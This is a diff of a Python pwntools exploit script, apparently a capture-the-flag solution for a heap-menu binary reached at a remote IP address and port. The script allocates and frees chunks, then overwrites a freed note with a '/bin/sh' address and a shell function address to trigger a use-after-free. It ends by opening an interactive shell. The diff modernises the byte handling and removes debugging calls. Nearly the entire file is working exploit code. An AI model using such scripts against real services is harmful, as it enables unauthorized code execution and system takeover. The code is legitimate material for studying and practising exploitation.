@@ -3,6 +3,7 @@
 
 import sys
 from typing import Optional, AnyStr
+from pathlib import Path
 from pwn import *
 from pwnlib import gdb
 
@@ -39,8 +40,9 @@ class Config:
             self.libc = f"/glibc/{libc_ver}/{arch}/lib/libc.so.6"
         self.remote_libc = self.libc if remote_libc is None else remote_libc
 
-
-cfg = Config("./pwn", "59.110.243.101", 54621, "2.23")
+fn = str(Path(__file__).parent.absolute() / Path("./pwn"))
+# cfg = Config(fn, "59.110.243.101", 54621, "2.23")
+cfg = Config(fn, "59.110.243.101", 54621)
 elf = ELF(cfg.elf)
 
 if len(sys.argv) > 1:
@@ -55,40 +57,36 @@ system_addr = 0x400A20
 binsh_addr = next(elf.search(b"/bin/sh\0"))
 
 def insert(size: int, data: bytes or bytearray) -> None:
-    io.sendlineafter("Your choice :", "1")
-    io.sendlineafter(":", str(size))
+    io.sendlineafter(b"Your choice :", b"1")
+    io.sendlineafter(b":", str(size).encode())
     if len(data) == size:
-        io.sendafter(":", data)
+        io.sendafter(b":", data)
     elif len(data) < size:
-        io.sendlineafter(":", data)
+        io.sendlineafter(b":", data)
     else:
         raise IndexError()
     # io.sendlineafter(b":", data)
 
 def output(idx: int) -> AnyStr:
-    io.sendlineafter("Your choice :", "3")
-    io.sendlineafter(":", str(idx))
-    return io.recvuntil("  welcome to magic room", drop=True)
+    io.sendlineafter(b"Your choice :", b"3")
+    io.sendlineafter(b":", str(idx).encode())
+    return io.recvuntil(b"  welcome to magic room", drop=True, timeout=3)
 
 def remove(idx: int):
-    io.sendlineafter("Your choice :", "2")
-    io.sendlineafter(":", str(idx))
+    io.sendlineafter(b"Your choice :", b"2")
+    io.sendlineafter(b":", str(idx).encode())
 
 def main():
-    try:
-        insert(0x100, b"/bin/sh\0")  # 0
-        insert(0x100, b"/bin/sh\0")  # 1
-        insert(0x100, b"/bin/sh\0")  # 2
-        remove(1)
-        remove(0)
-        pause()
-        insert(0x10,  p64(binsh_addr) + p64(shell_addr))
-        # insert(0x10, b'\x21' * 16)
-        # gdb.attach(io)
-        output(1)
-        io.interactive()
-    except Exception as e:
-        print(e)
+    insert(0x100, b"/bin/sh\0")  # 0
+    insert(0x100, b"/bin/sh\0")  # 1
+    insert(0x100, b"/bin/sh\0")  # 2
+    remove(1)
+    remove(0)
+    insert(0x10,  p64(binsh_addr) + p64(shell_addr))
+    output(1)
+    # io.sendlineafter(b"Your choice :", b"3")
+    # io.sendlineafter(b":", b"1")
+    io.interactive()
 
 if __name__ == "__main__":
     main()
